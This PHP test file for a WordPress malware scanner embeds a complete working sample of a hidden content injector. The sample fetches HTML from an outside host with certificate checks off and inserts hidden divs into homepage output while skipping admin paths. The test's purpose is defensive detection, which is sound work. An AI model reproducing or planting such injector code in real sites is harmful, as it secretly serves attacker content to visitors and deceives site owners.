<?php
// Normalized pasted sample. Read/scanned as text, never executed or fetched.
$sample = <<<'SAMPLE'
<?php
$SOURCE_URLS = array('https://web.emark.live/ini/kingitachi.txt');
$SKIP_PATTERNS = array('/wp-admin/', '/administrator/', '/user/login', '/wp-json', '/xmlrpc.php', '/api/', '/cron', '/vendor/');
function contentblock_should_skip($patterns) {
    $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
    if ($uri !== '/' && $uri !== '/index.php' && $uri !== '/index.html' && $uri !== '/?v=1') { return true; }
    foreach ($patterns as $p) { if ($p !== '' && strpos($uri, $p) !== false) return true; }
    return false;
}
function contentblock_is_html($buffer) {
    if (!is_string($buffer) || $buffer === '') return false;
    return stripos($buffer, '<html') !== false || stripos($buffer, '<!doctype') !== false || stripos($buffer, '</body>') !== false;
}
function contentblock_fetch_remote($url) {
    $content = '';
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 8, CURLOPT_USERAGENT => 'ContentFetcher/1.0'));
        @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if (is_string($resp) && $code >= 200 && $code < 300) $content = $resp;
    }
    if ($content === '' && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(array('http' => array('timeout' => 8, 'header' => "User-Agent: ContentFetcher/1.0\r\n"), 'ssl' => array('verify_peer'=>false, 'verify_peer_name'=>false)));
        $resp = @file_get_contents($url, false, $ctx);
        if ($resp !== false) $content = $resp;
    }
    return $content;
}
function contentblock_extract_hidden_div($html) {
    if (!is_string($html) || $html === '') return '';
    if (preg_match('/<div[^>]*\bstyle\s*=\s*["\'][^"\']*display\s*:\s*none[^"\']*["\'][^>]*>.*?<\/div>/is', $html, $m)) { return $m[0]; }
    if (preg_match('/<div[^>]*display\s*:\s*none[^>]*>.*?<\/div>/is', $html, $m2)) { return $m2[0]; }
    return '';
}
function contentblock_injector($buffer) {
    if (!contentblock_is_html($buffer)) return $buffer;
    global $SOURCE_URLS;
    $blocks = array();
    foreach ($SOURCE_URLS as $url) {
        $raw = contentblock_fetch_remote($url);
        if ($raw === '') continue;
        $raw = trim($raw);
        $block = contentblock_extract_hidden_div($raw);
        if ($block === '') $block = $raw;
        $blocks[] = $block;
    }
    if (empty($blocks)) return $buffer;
    $html = implode("\n", $blocks);
    $pos = stripos($buffer, '</body>');
    if ($pos !== false) { return substr($buffer, 0, $pos) . "\n" . $html . "\n" . substr($buffer, $pos); }
    return $buffer . "\n" . $html;
}
function contentblock_flush() { if (ob_get_level() > 0) @ob_end_flush(); }
if (!contentblock_should_skip($SKIP_PATTERNS)) {
    ob_start('contentblock_injector');
    register_shutdown_function('contentblock_flush');
}
?>
SAMPLE;
$repo = dirname(__DIR__, 2);
$ruleId = 'PHP_CONTENTBLOCK_REMOTE_HTML_INJECTOR_001';
$bundle = json_decode(file_get_contents($repo . '/intel/patterns/php-malware-rules.json'), true, 512, JSON_THROW_ON_ERROR);
$rule = array_values(array_filter($bundle['rules'], fn($r) => $r['id'] === $ruleId))[0];
$regex = '~' . $rule['pattern'] . '~i';
function check($condition, $message) { if (!$condition) { throw new RuntimeException($message); } }
check(preg_match($regex, $sample) === 1, 'Original sample matches');
check(preg_match($regex, str_replace('https://web.emark.live/ini/kingitachi.txt', 'https://example.invalid/changed.txt', $sample)) === 1, 'Changed collector URL matches');
check(preg_match($regex, preg_replace('/\s+/', ' ', $sample)) === 1, 'One-line formatting matches');
check(preg_match($regex, str_replace("'contentblock_injector'", '"contentblock_injector"', $sample)) === 1, 'Double-quoted callback matches');
foreach (['ob_start', 'curl_exec', 'register_shutdown_function', 'contentblock_extract_hidden_div'] as $required) {
    check(preg_match($regex, str_replace($required, 'benign_replacement', $sample)) === 0, 'Incomplete behavior does not match: ' . $required);
}
$benign = <<<'PHP'
<?php
function local_footer($buffer) { return str_replace('</body>', '<footer>Local footer</footer></body>', $buffer); }
ob_start('local_footer');
// A hidden accessibility panel uses display:none, unrelated to remote fetching.
PHP;
check(preg_match($regex, $benign) === 0, 'Legitimate output buffering does not match');
$base = sys_get_temp_dir() . '/warden-contentblock-test-' . bin2hex(random_bytes(6));
$root = $base . '/site';
mkdir($root . '/wp-content/themes/custom', 0700, true);
$path = $root . '/wp-content/themes/custom/functions.php';
file_put_contents($path, $sample);
file_put_contents($root . '/wp-content/themes/custom/footer.php', $benign);
$report = $base . '/report.json';
$args = [PHP_BINARY, $repo . '/scanner/wp-warden-pef.php', $root, '--intel-dir=' . $repo . '/intel', '--noninteractive', '--quiet', '--no-file-cache', '--apply', '--repair-original-auto', '--quarantine-malware-auto', '--quarantine=' . $base . '/quarantine', '--report-json=' . $report];
exec(implode(' ', array_map('escapeshellarg', $args)) . ' 2>&1', $output, $exit);
check(is_file($report), 'Report generated: ' . implode("\n", $output));
$result = json_decode(file_get_contents($report), true, 512, JSON_THROW_ON_ERROR);
$hits = array_values(array_filter($result['findings'], fn($f) => ($f['rule_id'] ?? '') === $ruleId));
check(count($hits) === 1 && $hits[0]['severity'] === 'critical', 'Scanner emits one critical family finding');
check($hits[0]['file_action'] === false, 'Finding is report-only');
check(file_get_contents($path) === $sample, 'Host theme remains intact under automatic cleanup flags');
echo "PASS contentblock sample, changed URL, formatting, partial negatives, legitimate buffering, scanner detection and host-file preservation\n";
